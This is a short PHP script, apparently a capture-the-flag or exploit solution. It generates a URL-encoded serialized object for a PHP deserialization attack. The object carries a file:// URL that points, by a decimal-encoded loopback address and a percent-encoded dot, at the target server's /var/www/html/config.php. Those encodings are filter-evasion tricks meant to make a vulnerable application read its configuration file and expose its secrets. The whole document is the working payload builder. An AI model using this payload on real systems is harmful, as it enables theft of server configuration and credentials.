<?php
class SHITS{
  private $url;
  private $method;

  function __construct(){
    $this->method = "doit";
    $this->url = "file://2130706434/var/www/html/config%2ephp";
  }
}
$a = new SHITS();
echo urlencode(serialize($a));
?>
